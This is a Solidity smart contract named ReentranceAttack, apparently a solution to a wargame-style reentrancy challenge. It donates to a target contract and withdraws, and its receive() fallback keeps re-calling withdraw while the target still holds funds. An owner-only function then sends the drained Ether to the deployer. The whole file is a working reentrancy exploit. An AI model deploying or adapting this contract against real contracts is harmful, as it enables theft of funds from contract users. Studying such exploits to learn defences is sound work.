// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    address public owner;
    IReentrance targetContract;
    uint targetValue = 1000000000000000;

    constructor(address _targetAddr) public {
        targetContract = IReentrance(_targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        targetContract.donate.value(msg.value)(address(this));
        targetContract.withdraw(msg.value);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "my money!!");
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call.value(totalBalance)("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable {
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
          targetContract.withdraw(targetValue);
        }
    }
}